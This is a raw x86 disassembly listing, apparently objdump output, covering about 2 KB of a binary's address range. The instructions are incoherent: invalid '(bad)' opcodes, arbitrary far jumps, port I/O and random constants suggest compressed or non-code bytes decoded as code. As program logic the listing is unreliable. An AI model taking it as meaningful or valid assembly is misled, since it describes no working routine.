  4152ee:	outs   dx,DWORD PTR ds:[esi]
  4152ef:	xor    DWORD PTR [ebp+0x68fcb9b2],eax
  4152f5:	or     BYTE PTR [ebp-0x55],dl
  4152f8:	stos   BYTE PTR es:[edi],al
  4152f9:	cmp    BYTE PTR [ebx],ah
  4152fb:	fsubr  QWORD PTR [eax+eiz*8-0x5e56c822]
  415302:	pop    ss
  415303:	mov    ds:0x5e234b6e,al
  415308:	push   esi
  415309:	out    0xd8,al
  41530b:	push   esp
  41530c:	or     BYTE PTR [edi-0x169c4452],0x54
  415313:	pop    ebp
  415314:	sub    ah,bl
  415316:	cmp    edx,0x3963a9eb
  41531c:	dec    esi
  41531d:	ins    BYTE PTR es:[edi],dx
  41531e:	sar    dl,cl
  415320:	mov    bl,BYTE PTR [esi]
  415322:	push   ss
  415323:	outs   dx,BYTE PTR ds:[esi]
  415324:	xchg   esp,eax
  415325:	int3   
  415326:	cmp    BYTE PTR [ebx+0x597ba40b],dh
  41532c:	mov    edi,0x1d611014
  415331:	repz sbb DWORD PTR [ebx],edx
  415334:	jmp    0xabd8:0x89a2a861
  41533b:	bound  ecx,QWORD PTR [ebp+0xf]
  41533e:	or     BYTE PTR [ebx+edx*8],bh
  415341:	pop    es
  415342:	push   esp
  415343:	leave  
  415344:	into   
  415345:	push   esi
  415346:	rol    DWORD PTR [edx],1
  415348:	jp     0x41534c
  41534a:	push   edx
  41534b:	stos   BYTE PTR es:[edi],al
  41534c:	call   DWORD PTR [edi+0xef171b]
  415352:	(bad)  
  415353:	stc    
  415354:	pop    edx
  415355:	mov    ebx,0x741dd3ec
  41535a:	adc    DWORD PTR [edx-0x6c],ebx
  41535d:	cmp    DWORD PTR [ecx+0x60],0x7d
  415361:	sbb    DWORD PTR [edi+0x9],esp
  415364:	xor    ecx,ecx
  415366:	push   edi
  415367:	xchg   edi,eax
  415368:	aaa    
  415369:	sub    DWORD PTR [eax+0x4798ce00],0x4f6237a3
  415373:	cmp    bl,BYTE PTR [ecx]
  415375:	and    BYTE PTR [ebx-0x7b],dl
  415378:	test   ah,0x19
  41537b:	loopne 0x41539f
  41537d:	retf   0xd219
  415380:	inc    esp
  415381:	xor    BYTE PTR [ebx-0x14],cl
  415384:	ffreep st(6)
  415386:	push   edx
  415387:	mov    ecx,ds
  415389:	cmp    al,0x1c
  41538b:	sub    esi,esi
  41538d:	lods   eax,DWORD PTR ds:[esi]
  41538e:	mov    bl,0xe
  415390:	(bad)  
  415392:	das    
  415393:	bound  esi,QWORD PTR ds:[ecx-0x3aaeada0]
  41539a:	ss and al,0xb0
  41539d:	imul   ecx,DWORD PTR [esi+esi*8+0x35],0x8
  4153a2:	and    ch,ch
  4153a4:	jno    0x41535b
  4153a6:	jp     0x41535c
  4153a8:	cmp    eax,0xe711f568
  4153ad:	inc    ecx
  4153ae:	retf   0xc224
  4153b1:	cmp    eax,DWORD PTR [esp+edx*8]
  4153b4:	sbb    eax,0xb68ddeb0
  4153b9:	test   DWORD PTR [edi],edx
  4153bb:	ror    BYTE PTR [edx-0x184847ea],0x4e
  4153c2:	scas   eax,DWORD PTR es:[edi]
  4153c3:	mov    DWORD PTR [ebx+0x3a],eax
  4153c6:	retf   0xd4f2
  4153c9:	pusha  
  4153ca:	mov    ebp,0x81aa1c66
  4153cf:	sbb    al,BYTE PTR [ebx+0x5a]
  4153d2:	sar    DWORD PTR [edx],0x71
  4153d5:	and    DWORD PTR [ebp+esi*4-0x1f],ecx
  4153d9:	inc    edx
  4153da:	pop    edi
  4153db:	std    
  4153dc:	or     al,0xb3
  4153de:	ja     0x415426
  4153e0:	pop    edi
  4153e1:	mov    bl,0xdb
  4153e3:	arpl   WORD PTR ds:0xf5baee1a,bx
  4153e9:	je     0x415384
  4153eb:	ins    BYTE PTR es:[edi],dx
  4153ec:	sar    DWORD PTR [edx],1
  4153ee:	clc    
  4153ef:	cwde   
  4153f0:	sub    DWORD PTR [ebx],eax
  4153f2:	xor    al,0x25
  4153f4:	fisttp DWORD PTR [edx-0x2aa7c6a2]
  4153fa:	or     al,0xd2
  4153fc:	test   al,0x28
  4153fe:	ins    BYTE PTR es:[edi],dx
  4153ff:	sub    eax,DWORD PTR [ecx+edx*8+0x4f]
  415403:	mov    DWORD PTR [ebx+0x2c],esi
  415406:	outs   dx,DWORD PTR ds:[esi]
  415407:	das    
  415408:	dec    esp
  415409:	pop    esp
  41540a:	icebp  
  41540b:	or     DWORD PTR [edi-0x35],0x5
  41540f:	stc    
  415410:	jnp    0x4153cb
  415412:	lods   eax,DWORD PTR ds:[esi]
  415413:	out    0xf5,eax
  415415:	sub    eax,esi
  415417:	ins    DWORD PTR es:[edi],dx
  415418:	adc    eax,0x9e718453
  41541d:	loopne 0x41544d
  41541f:	add    DWORD PTR [edx],edx
  415421:	repnz push cs
  415423:	sub    edx,DWORD PTR [ecx+0x24]
  415426:	xor    DWORD PTR [esi-0x20],eax
  415429:	add    al,0x89
  41542b:	test   BYTE PTR [ecx],al
  41542d:	adc    esi,ecx
  41542f:	call   0x3926:0x2d408f32
  415436:	in     eax,dx
  415437:	ins    BYTE PTR es:[edi],dx
  415438:	popa   
  415439:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41543a:	pop    eax
  41543b:	scas   al,BYTE PTR es:[edi]
  41543c:	dec    edx
  41543d:	dec    esp
  41543e:	(bad)  
  41543f:	ret    
  415440:	jo     0x4153f3
  415442:	jo     0x4153e6
  415444:	icebp  
  415445:	jbe    0x4153d1
  415447:	mov    bl,0x34
  415449:	lea    esp,[esi]
  41544b:	in     eax,dx
  41544c:	push   edx
  41544d:	nop
  41544e:	or     eax,0xfdc05a
  415453:	add    DWORD PTR [esi+edi*4+0x60],eax
  415457:	fsubr  DWORD PTR [eax-0x26]
  41545a:	push   edx
  41545b:	mov    BYTE PTR [esi+0x2f],al
  41545e:	cli    
  41545f:	inc    esp
  415460:	jae    0x415489
  415462:	adc    al,0x54
  415464:	dec    esp
  415465:	pop    ds
  415466:	add    al,0xa8
  415468:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  415469:	out    0xae,eax
  41546b:	clc    
  41546c:	pusha  
  41546d:	jns    0x41541b
  41546f:	daa    
  415470:	icebp  
  415471:	iret   
  415472:	lahf   
  415473:	rcr    DWORD PTR [ebx],cl
  415475:	inc    ebx
  415476:	adc    al,0xc7
  415478:	push   edi
  415479:	je     0x41549d
  41547b:	push   edx
  41547c:	lock pop edi
  41547e:	jle    0x4154e8
  415480:	inc    esp
  415481:	xor    ah,BYTE PTR [eax]
  415483:	(bad)  
  415484:	cmp    eax,0x8545250b
  415489:	js     0x4154db
  41548b:	pusha  
  41548c:	out    0x5a,al
  41548e:	(bad)  
  41548f:	jae    0x4154ae
  415491:	xchg   edi,eax
  415492:	cmp    esi,DWORD PTR [esi-0x17]
  415495:	or     edx,esi
  415497:	push   ss
  415498:	lock jmp 0x4154e7
  41549b:	dec    ebp
  41549c:	mov    ds:0x508d8474,eax
  4154a1:	mov    ds,WORD PTR [esi+0x640e1c05]
  4154a7:	add    ebx,DWORD PTR [ecx]
  4154a9:	dec    edi
  4154aa:	jge    0x415505
  4154ac:	jno    0x4154e9
  4154ae:	mov    DWORD PTR [eax+0x73bd64c0],edi
  4154b4:	(bad)  
  4154b5:	xor    eax,0xbea086d0
  4154ba:	lods   eax,DWORD PTR ds:[esi]
  4154bb:	xchg   ebx,eax
  4154bc:	cdq    
  4154bd:	mov    WORD PTR [ecx],?
  4154bf:	add    DWORD PTR ds:0x3b47f45f,edi
  4154c5:	and    BYTE PTR [ebx+ebx*4],al
  4154c8:	das    
  4154c9:	dec    sp
  4154cb:	cmp    edx,DWORD PTR [edx-0x37]
  4154ce:	jo     0x4154e5
  4154d0:	xchg   BYTE PTR [ebx],dl
  4154d2:	cwde   
  4154d3:	xchg   BYTE PTR [ebp+0x1d],ch
  4154d6:	jmp    0xc6db:0x7b927214
  4154dd:	mov    bh,0x8f
  4154df:	imul   edx,DWORD PTR [esi+0x59],0x1b
  4154e3:	es int 0x2b
  4154e6:	sbb    esi,0x25b2cedd
  4154ec:	sbb    eax,0x8a716501
  4154f1:	aad    0xb
  4154f3:	pushw  0xc85d
  4154f7:	les    ecx,FWORD PTR [eax+0x3]
  4154fa:	inc    eax
  4154fb:	push   esp
  4154fc:	mov    dl,0x2f
  4154fe:	jp     0x41556c
  415500:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  415501:	(bad)  
  415503:	mov    ah,0x44
  415505:	mov    ebx,0xce406b49
  41550a:	out    0xd1,eax
  41550c:	shl    ebp,cl
  41550e:	add    DWORD PTR [ebp+0x73],eax
  415511:	clc    
  415512:	pop    ss
  415513:	cs mov esp,0xf53c4aa5
  415519:	shl    DWORD PTR [eax-0x50],1
  41551c:	sbb    ch,ah
  41551e:	arpl   WORD PTR [edx-0x743f0ac0],ax
  415524:	or     esp,DWORD PTR [esi+0x577ec1cb]
  41552a:	bswap  eax
  41552c:	lods   al,BYTE PTR ds:[esi]
  41552d:	pop    eax
  41552e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41552f:	dec    esp
  415530:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  415531:	xchg   ebx,eax
  415532:	popa   
  415533:	mov    edx,0xe1106fdd
  415538:	cwde   
  415539:	out    dx,eax
  41553a:	ss xchg ebx,eax
  41553c:	orps   xmm5,xmm7
  41553f:	or     bl,cl
  415541:	mov    esi,0x5c5f49c7
  415546:	lea    edi,[ecx+0x7740bb91]
  41554c:	pop    ds
  41554d:	leave  
  41554e:	aas    
  41554f:	or     al,0xac
  415551:	in     eax,dx
  415552:	mov    edi,0x6a5bd6de
  415557:	cmp    al,0x8b
  415559:	mov    eax,ds:0xb15dbeb1
  41555e:	push   ss
  41555f:	cli    
  415560:	(bad)  
  415561:	mov    dh,0xd2
  415563:	ins    DWORD PTR es:[edi],dx
  415564:	jecxz  0x415596
  415566:	cmp    DWORD PTR gs:[edx],edx
  415569:	jecxz  0x41552c
  41556b:	mov    ah,al
  41556d:	push   ebx
  41556e:	cmp    BYTE PTR [ebx+0x10],0x70
  415572:	fisubr DWORD PTR [ecx+0x4d06c42f]
  415578:	scas   eax,DWORD PTR es:[edi]
  415579:	(bad)  
  41557a:	fsub   DWORD PTR [ecx-0x7e]
  41557d:	je     0x4155d0
  41557f:	xchg   esi,eax
  415580:	xor    DWORD PTR [edx],0xe98eabb1
  415586:	push   ds
  415587:	ss leave 
  415589:	aas    
  41558a:	rol    DWORD PTR [esi],cl
  41558c:	gs dec esp
  41558e:	sti    
  41558f:	sahf   
  415590:	aad    0xe5
  415592:	mov    cl,0x46
  415594:	or     ebp,DWORD PTR [edi+0x6]
  415597:	push   esi
  415598:	push   edx
  415599:	je     0x4155f1
  41559b:	into   
  41559c:	les    ebx,FWORD PTR ds:0x3af5f672
  4155a2:	mov    dl,0xa
  4155a4:	outs   dx,DWORD PTR ds:[esi]
  4155a5:	push   esi
  4155a6:	pop    esi
  4155a7:	jle    0x4155a6
  4155a9:	shl    DWORD PTR [ebp-0x64],1
  4155ac:	ins    BYTE PTR es:[edi],dx
  4155ad:	cmovl  edx,DWORD PTR [ecx-0xed78d9]
  4155b4:	pop    ebx
  4155b5:	(bad)  
  4155b6:	jle    0x415547
  4155b8:	sbb    edx,ebp
  4155ba:	jne    0x4155dd
  4155bc:	ficomp WORD PTR [ecx-0x55d734ea]
  4155c2:	jb     0x415581
  4155c4:	sub    BYTE PTR [ecx],bl
  4155c6:	cmp    BYTE PTR [edx+ecx*8],0x41
  4155ca:	dec    esp
  4155cb:	popa   
  4155cc:	push   es
  4155cd:	dec    esi
  4155ce:	xor    al,0x8f
  4155d0:	data16 fcmovne st,st(2)
  4155d3:	xor    esp,ebx
  4155d5:	mov    ah,0xcc
  4155d7:	pop    es
  4155d8:	aad    0xed
  4155da:	xor    al,BYTE PTR [edi-0x21dfadb6]
  4155e0:	in     eax,dx
  4155e1:	inc    eax
  4155e2:	inc    edx
  4155e3:	and    DWORD PTR gs:[esi+0x37],esp
  4155e7:	not    BYTE PTR [esi]
  4155e9:	xchg   DWORD PTR [esi-0x42],esp
  4155ec:	fcom   st(7)
  4155ee:	bound  ecx,QWORD PTR [ebp+0x7f]
  4155f1:	lea    esi,[ebx-0x26]
  4155f4:	mov    edi,0xaad61df1
  4155f9:	aas    
  4155fa:	hlt    
  4155fb:	mov    esp,0xe34aa9c5
  415600:	inc    edi
  415601:	adc    al,0x43
  415603:	add    eax,0x60b09847
  415608:	push   0x2f
  41560a:	add    al,0xd7
  41560c:	and    eax,0x2ffa3bbb
  415611:	ja     0x415593
  415613:	pusha  
  415614:	pusha  
  415615:	clc    
  415616:	xor    bl,BYTE PTR [edx]
  415618:	mov    al,0x22
  41561a:	dec    esi
  41561b:	je     0x415659
  41561d:	cdq    
  41561e:	inc    ebp
  41561f:	lea    edi,[ebx+0x6d0adaf5]
  415625:	in     al,dx
  415626:	push   edx
  415627:	in     eax,dx
  415628:	aad    0xb5
  41562a:	enter  0x1dec,0x53
  41562e:	cwde   
  41562f:	das    
  415630:	or     eax,0x533baaf3
  415635:	mov    ch,0xcb
  415637:	adc    eax,0x608c0e5b
  41563c:	jl     0x415658
  41563e:	push   esp
  41563f:	dec    ecx
  415640:	test   DWORD PTR [edx-0x5f07ca62],ebx
  415646:	inc    ebx
  415647:	(bad)  
  415648:	mov    ch,0x9d
  41564a:	cmc    
  41564b:	or     eax,0x230cb14f
  415650:	retf   
  415651:	and    eax,0xaf6c178a
  415656:	iret   
  415657:	push   edi
  415658:	out    dx,eax
  415659:	sub    BYTE PTR [esi],al
  41565b:	hlt    
  41565c:	or     BYTE PTR [eax-0x54fb659d],dh
  415662:	mov    dl,BYTE PTR [ebx-0x37]
  415665:	xor    al,0x9f
  415667:	push   esi
  415668:	or     eax,0xcde36d56
  41566d:	and    al,0x10
  41566f:	js     0x41565c
  415671:	mov    DWORD PTR [edx],eax
  415673:	cmp    DWORD PTR [esi-0x31],edx
  415676:	data16 cli 
  415678:	imul   DWORD PTR [eax]
  41567a:	mov    ah,BYTE PTR [edx+0x78]
  41567d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41567e:	jns    0x415634
  415680:	int3   
  415681:	push   ebx
  415682:	mov    dl,0xad
  415684:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  415685:	sub    cl,BYTE PTR [eax+0xa]
  415688:	xchg   ebp,eax
  415689:	dec    eax
  41568a:	and    al,0x4c
  41568c:	mov    al,ds:0xafd8d683
  415691:	mov    ax,0x9e64
  415695:	push   esi
  415696:	rcr    DWORD PTR [ebx+ebx*4+0x111edc35],cl
  41569d:	sub    al,bh
  41569f:	jmp    0xe9d1f52b
  4156a4:	addr16 and dh,dh
  4156a7:	jecxz  0x415645
  4156a9:	stos   BYTE PTR es:[edi],al
  4156aa:	jno    0x41566d
  4156ac:	or     ecx,edi
  4156ae:	cli    
  4156af:	cmp    eax,ecx
  4156b1:	push   ss
  4156b2:	cmp    DWORD PTR [eax+ebx*4-0x42],0xf95f2e0f
  4156ba:	adc    esp,DWORD PTR [edi+0x58]
  4156bd:	inc    ebp
  4156be:	ror    BYTE PTR [esi+edx*2+0x15],cl
  4156c2:	jp     0x4156af
  4156c4:	sbb    al,0x9c
  4156c6:	inc    esp
  4156c7:	pop    ecx
  4156c8:	mov    ch,BYTE PTR [eax]
  4156ca:	sbb    DWORD PTR [esi+0x24],ebp
  4156cd:	fwait
  4156ce:	sbb    esi,eax
  4156d0:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4156d1:	pop    ds
  4156d2:	popf   
  4156d3:	das    
  4156d4:	mov    ebx,0xf93c0478
  4156d9:	sub    cl,al
  4156db:	adc    eax,DWORD PTR [edi]
  4156dd:	xlat   BYTE PTR ds:[ebx]
  4156de:	push   esi
  4156df:	rol    bl,1
  4156e1:	add    BYTE PTR [esi-0xd],al
  4156e4:	popf   
  4156e5:	mul    BYTE PTR [eax+eax*1-0x1c]
  4156e9:	arpl   WORD PTR [edx+0x206c6756],sp
  4156ef:	cs cdq 
  4156f1:	retf   0x208
  4156f4:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4156f5:	or     BYTE PTR [ebx-0x40],cl
  4156f8:	imul   eax,eax,0x75
  4156fb:	aas    
  4156fc:	jle    0x415753
  4156fe:	jge    0x415704
  415700:	dec    ecx
  415701:	out    0x62,al
  415703:	iret   
  415704:	or     eax,0x516060e0
  415709:	mov    al,0x86
  41570b:	leave  
  41570c:	in     al,0x92
  41570e:	dec    edx
  41570f:	xchg   esp,ecx
  415711:	mov    ecx,0x2d6567f6
  415716:	loop   0x4156e9
  415718:	inc    ebx
  415719:	lock fdivrp st(4),st
  41571c:	repz call 0x10c7375d
  415722:	lock addr16 xchg edi,eax
  415725:	clc    
  415726:	push   ds
  415727:	jecxz  0x415775
  415729:	or     ebp,DWORD PTR [ebx+0x47e09603]
  41572f:	mov    cl,BYTE PTR [eax-0x2e]
  415732:	fstp   QWORD PTR [ebp-0x542bddf9]
  415738:	lahf   
  415739:	push   es
  41573a:	cld    
  41573b:	mov    bh,0x87
  41573d:	mov    ah,0xee
  41573f:	adc    al,0x47
  415741:	into   
  415742:	cli    
  415743:	xchg   ebx,eax
  415744:	iret   
  415745:	iret   
  415746:	xchg   edx,eax
  415747:	push   es
  415748:	dec    edx
  415749:	cmp    ch,BYTE PTR [ecx+0xe]
  41574c:	pop    ebp
  41574d:	and    BYTE PTR [ebx],al
  41574f:	outs   dx,BYTE PTR ds:[esi]
  415750:	shl    ebp,cl
  415752:	xchg   edx,eax
  415753:	and    ebx,DWORD PTR cs:[ebx-0x14b4563d]
  41575a:	lds    ecx,FWORD PTR [edx+0x1f90eb3b]
  415760:	or     al,0x4f
  415762:	sbb    DWORD PTR [edx-0x396fa2c8],0xffffffe2
  415769:	xor    BYTE PTR [ebp+0x40033e24],0xaa
  415770:	out    0xbb,al
  415772:	xchg   edi,eax
  415773:	xor    BYTE PTR ds:0xf14aa716,0xb9
  41577a:	jne    0x41572f
  41577c:	ud2    
  41577e:	jmp    0x4157bc
  415780:	js     0x4157a0
  415782:	clc    
  415783:	(bad)  
  415784:	cmp    ebx,edx
  415786:	pop    gs
  415788:	pop    es
  415789:	mov    ebx,0x979de3a0
  41578e:	jle    0x4157a8
  415790:	and    esp,DWORD PTR [esi+0x1a]
  415793:	es clc 
  415795:	clc    
  415796:	scas   eax,DWORD PTR es:[edi]
  415797:	rcl    BYTE PTR [edx],1
  415799:	sub    dl,ah
  41579b:	cli    
  41579c:	dec    edx
  41579d:	sti    
  41579e:	sbb    bh,BYTE PTR [edi]
  4157a0:	or     BYTE PTR [ebp+esi*1+0x78],ch
  4157a4:	xchg   ebp,eax
  4157a5:	call   0x57502b4e
  4157aa:	aad    0xc6
  4157ac:	stc    
  4157ad:	in     al,0xdc
  4157af:	dec    ebx
  4157b0:	les    esi,FWORD PTR [esi+0xeb3b6c5]
  4157b6:	jno    0x415828
  4157b8:	xlat   BYTE PTR ds:[ebx]
  4157b9:	lds    edx,FWORD PTR [ecx-0x4c]
  4157bc:	adc    al,0x8b
  4157be:	add    dl,dl
  4157c0:	scas   al,BYTE PTR es:[edi]
  4157c1:	test   al,0xe
  4157c3:	cld    
  4157c4:	jns    0x415787
  4157c6:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4157c7:	adc    al,0xa5
  4157c9:	or     DWORD PTR ds:0x6af735d1,eax
  4157cf:	fcmovne st,st(6)
  4157d1:	inc    edx
  4157d2:	sbb    eax,0x7b1c61c1
  4157d7:	pusha  
  4157d8:	inc    esi
  4157d9:	jmp    0xbaa6ff20
  4157de:	outs   dx,BYTE PTR ds:[esi]
  4157df:	dec    edx
  4157e0:	mov    eax,ds:0x607ae4be
  4157e5:	sub    dl,BYTE PTR [eax]
  4157e7:	dec    ebx
  4157e8:	mov    al,ds:0x3608de5b
  4157ed:	das    
  4157ee:	mov    bl,0x53
  4157f0:	cdq    
  4157f1:	jmp    DWORD PTR [ecx+0x79]
  4157f4:	cmp    dh,dh
  4157f6:	pop    ecx
  4157f7:	and    BYTE PTR [esi+0x1],al
  4157fa:	cli    
  4157fb:	mov    ch,0xe6
  4157fd:	or     al,0xa3
  4157ff:	jmp    0x4157e7
  415801:	push   ss
  415802:	inc    edx
  415803:	dec    BYTE PTR [eax+0x6a514cec]
  415809:	mov    esi,0x2564c864
  41580e:	fisub  DWORD PTR [edi-0x6bbabfd6]
  415814:	xchg   ecx,eax
  415815:	aad    0x30
  415817:	fucomp st(4)
  415819:	dec    esi
  41581a:	xchg   edi,eax
  41581b:	gs dec ebx
  41581d:	out    dx,al
  41581e:	pop    es
  41581f:	jp     0x4158a0
  415821:	(bad)  
  415822:	cdq    
  415823:	loop   0x41584a
  415825:	add    BYTE PTR ds:0x692eb231,ch
  41582b:	mov    ds:0xfeada75d,al
  415830:	mov    dl,0xab
  415832:	mov    al,0xf5
  415834:	push   eax
  415835:	repz sub ebp,DWORD PTR gs:[edx+0x18deefda]
  41583d:	stos   BYTE PTR es:[edi],al
  41583e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41583f:	mov    ecx,0xa2d8a653
  415844:	sbb    edi,DWORD PTR [ecx+0x9]
  415847:	ins    DWORD PTR es:[edi],dx
  415848:	pop    esp
  415849:	in     eax,0xf0
  41584b:	jns    0x4157ee
  41584d:	(bad)  
  41584e:	jle    0x4158ae
  415850:	stos   DWORD PTR es:[edi],eax
  415851:	ficomp WORD PTR [edi]
  415853:	mov    esi,0xd6f2abe
  415858:	pop    esi
  415859:	rcr    DWORD PTR [ecx],cl
  41585b:	call   0xfae3:0xf494b449
  415862:	and    al,0xe8
  415864:	sub    cl,BYTE PTR ds:0x66d992c0
  41586a:	push   ebp
  41586b:	stos   BYTE PTR es:[edi],al
  41586c:	icebp  
  41586d:	repnz inc ebx
  41586f:	sbb    al,0x4c
  415871:	loope  0x4158ae
  415873:	pop    ecx
  415874:	icebp  
  415875:	loopne 0x4158b1
  415877:	inc    cx
  415879:	test   DWORD PTR [eax],0xc8460f1e
  41587f:	push   0x5f
  415881:	stos   BYTE PTR es:[edi],al
  415882:	fwait
  415883:	out    0xc5,al
  415885:	sti    
  415886:	test   al,0x6
  415888:	enterw 0x7b99,0x71
  41588d:	xchg   edx,eax
  41588e:	or     al,BYTE PTR [ecx-0x34b6d335]
  415894:	xor    eax,0xb5e77ca1
  415899:	loopne 0x41583a
  41589b:	js     0x415881
  41589d:	(bad)  
  41589e:	jno    0x4158d2
  4158a0:	into   
  4158a1:	jmp    0x41587d
  4158a3:	rcl    esi,cl
  4158a5:	pop    es
  4158a6:	cmp    dh,ah
  4158a8:	inc    esp
  4158a9:	dec    ebp
  4158aa:	push   edi
  4158ab:	in     al,0xc5
  4158ad:	ds cld 
  4158af:	mov    ds:0xfc373c6,eax
  4158b4:	dec    edi
  4158b5:	adc    BYTE PTR [eax+eiz*2+0x4000121d],bl
  4158bc:	jbe    0x415870
  4158be:	sahf   
  4158bf:	cmp    al,0x1c
  4158c1:	imul   ecx,ebx,0x4f
  4158c4:	xchg   esp,eax
  4158c5:	and    DWORD PTR [edx-0x4135bc26],edx
  4158cb:	mov    al,0x1e
  4158cd:	xchg   esp,eax
  4158ce:	stos   BYTE PTR es:[edi],al
  4158cf:	test   DWORD PTR [ebp-0x6fa95773],esi
  4158d5:	mov    ah,BYTE PTR [edx+0x28bc7eda]
  4158db:	dec    edi
  4158dc:	cli    
  4158dd:	cld    
  4158de:	dec    ecx
  4158df:	sbb    eax,0xc36cea90
  4158e4:	and    ebx,esi
  4158e6:	sbb    al,0xa0
  4158e8:	pop    ebp
  4158e9:	pop    ebx
  4158ea:	or     eax,0x59e5f33c
  4158ef:	dec    esp
  4158f0:	fwait
  4158f1:	iret   
  4158f2:	add    al,0x46
  4158f4:	sbb    cl,dl
  4158f6:	std    
  4158f7:	lahf   
  4158f8:	adc    esi,DWORD PTR [eax+0x51]
  4158fb:	out    0x81,eax
  4158fd:	ja     0x415965
  4158ff:	pushf  
  415900:	mov    ch,0x81
  415902:	out    dx,eax
  415903:	lea    ebp,[eax]
  415905:	push   edi
  415906:	cmp    DWORD PTR [ecx-0x3a161ad4],ebp
  41590c:	pop    DWORD PTR [ecx-0x17]
  41590f:	adc    esi,DWORD PTR [edi]
  415911:	jmp    DWORD PTR [ebx-0x74ebd95e]
  415917:	rcl    BYTE PTR [ecx+0x7829a7d5],cl
  41591d:	loopne 0x4158ea
  41591f:	std    
  415920:	add    BYTE PTR [edx+edi*4+0x53],al
  415924:	repnz div DWORD PTR ds:0xa102ff6d
  41592b:	dec    esi
  41592c:	stc    
  41592d:	mov    bh,0xfc
  41592f:	xor    ah,BYTE PTR [esi]
  415931:	xor    al,0x4d
  415933:	(bad)  [edi+0x78e436b9]
  415939:	push   0x22
  41593b:	add    ebx,eax
  41593d:	and    dh,al
  41593f:	pop    edx
  415940:	int    0x1e
  415942:	or     dl,ah
  415944:	xchg   ah,bh
  415946:	lea    edx,[ecx+0x45]
  415949:	push   edx
  41594a:	push   edx
  41594b:	(bad)  [eax]
  41594d:	or     al,0x3e
  41594f:	xor    DWORD PTR [ecx+0x20],edi
  415952:	add    ch,bh
  415954:	jmp    0x2653eb6c
  415959:	outs   dx,DWORD PTR ds:[esi]
  41595a:	xchg   edi,eax
  41595b:	push   cs
  41595c:	mov    WORD PTR [ebx+0xcf81c43],fs
  415962:	pushf  
  415963:	cmp    DWORD PTR [eax-0x472276d7],esp
  415969:	lahf   
  41596a:	ret    0xd87e
  41596d:	push   ebx
  41596e:	mov    eax,ds:0xbe68beff
  415973:	stos   DWORD PTR es:[edi],eax
  415974:	aam    0x55
  415976:	stos   DWORD PTR es:[edi],eax
  415977:	scas   al,BYTE PTR es:[edi]
  415978:	xor    DWORD PTR [edx-0x24],edi
  41597b:	cs lock mul BYTE PTR ss:[edx-0x1c]
  415981:	repnz gs pop eax
  415984:	inc    ecx
  415985:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  415986:	mov    cl,0x52
  415988:	jmp    0x9ea9:0xca85eda2
  41598f:	int3   
  415990:	pop    es
  415991:	in     eax,0x83
  415993:	(bad)  
  415994:	je     0x415a0d
  415996:	ins    DWORD PTR es:[edi],dx
  415997:	or     al,0x40
  415999:	push   edx
  41599a:	loope  0x4159f8
  41599c:	lods   al,BYTE PTR ds:[esi]
  41599d:	pop    ecx
  41599e:	sti    
  41599f:	add    edi,DWORD PTR [esi]
  4159a1:	mov    bh,0x71
  4159a3:	mov    esi,0x948c925d
  4159a8:	add    BYTE PTR [edi],al
  4159aa:	or     bl,cl
  4159ac:	cdq    
  4159ad:	add    al,BYTE PTR [esi-0x1e]
  4159b0:	xor    al,0xce
  4159b2:	popa   
  4159b3:	adc    DWORD PTR [edx],edi
  4159b5:	and    al,0xdd
  4159b7:	cmp    DWORD PTR [ecx+0x698b3831],ebx
  4159bd:	ja     0x4159ad
  4159bf:	dec    edi
  4159c0:	cmc    
  4159c1:	mov    edx,DWORD PTR [edx]
  4159c3:	or     BYTE PTR [edi+eiz*8],bl
  4159c6:	stos   BYTE PTR es:[edi],al
  4159c7:	aas    
  4159c8:	ja     0x4159fd
  4159ca:	test   BYTE PTR [esi-0x60],cl
  4159cd:	sub    edi,esp
  4159cf:	cld    
  4159d0:	xchg   BYTE PTR [edx+0x285b31fd],ch
  4159d6:	mov    ecx,0x36226162
  4159db:	xor    ah,BYTE PTR [ecx]
  4159dd:	adc    al,0xc6
  4159df:	dec    ecx
  4159e0:	mov    ecx,0xe9e329dc
  4159e5:	dec    esi
  4159e6:	add    ebx,DWORD PTR [esi]
  4159e8:	or     esi,ecx
  4159ea:	out    dx,eax
  4159eb:	add    edi,DWORD PTR [ebp+0x60]
  4159ee:	and    al,0xe7
  4159f0:	sahf   
  4159f1:	xchg   edx,eax
  4159f2:	mov    esp,DWORD PTR [ecx-0x6e]
  4159f5:	push   ds
  4159f6:	loopne 0x4159ae
  4159f8:	fmul   QWORD PTR [ebp+0x17]
  4159fb:	mov    bh,0x45
  4159fd:	sub    DWORD PTR [esi+eiz*2-0x382d959c],esp
  415a04:	sbb    BYTE PTR [esi],ah
  415a06:	pop    edx
  415a07:	mov    eax,ds:0xbde6eea2
  415a0c:	lock icebp 
  415a0e:	lock jmp 0x415a8d
  415a11:	mov    WORD PTR [esp+edx*8-0x10976748],gs
  415a18:	ins    BYTE PTR es:[edi],dx
  415a19:	fs int 0x3f
  415a1c:	fwait
  415a1d:	mov    BYTE PTR [esp+eax*2],ch
  415a20:	mov    edi,DWORD PTR [eax]
  415a22:	push   esi
  415a23:	pop    esp
  415a24:	jecxz  0x415a7f
  415a26:	sbb    eax,0xb0a51972
  415a2b:	hlt    
  415a2c:	cld    
  415a2d:	push   eax
  415a2e:	lock jae 0x415aa5
  415a31:	add    eax,0xd86377f7
  415a36:	push   cs
  415a37:	fimul  DWORD PTR [ecx]
  415a39:	out    0xc1,eax
  415a3b:	pop    ebp
  415a3c:	jmp    0x393d7eb5
  415a41:	mov    bl,0x26
  415a43:	mov    esp,0xbc42fa33
  415a48:	dec    edx
  415a49:	inc    eax
  415a4a:	and    al,0xf
  415a4c:	dec    edi
  415a4d:	rol    DWORD PTR [ecx+0x26],cl
  415a50:	inc    ecx
  415a51:	mov    ecx,0x88e5f02a
  415a56:	jmp    0x415a59
  415a58:	enter  0xd6b0,0xfa
  415a5c:	dec    ecx
  415a5d:	fcmovu st,st(0)
  415a5f:	jge    0x415abd
  415a61:	mov    edi,0x3a430489
  415a66:	mov    al,al
  415a68:	push   es
  415a69:	mov    es:0xbc430697,eax
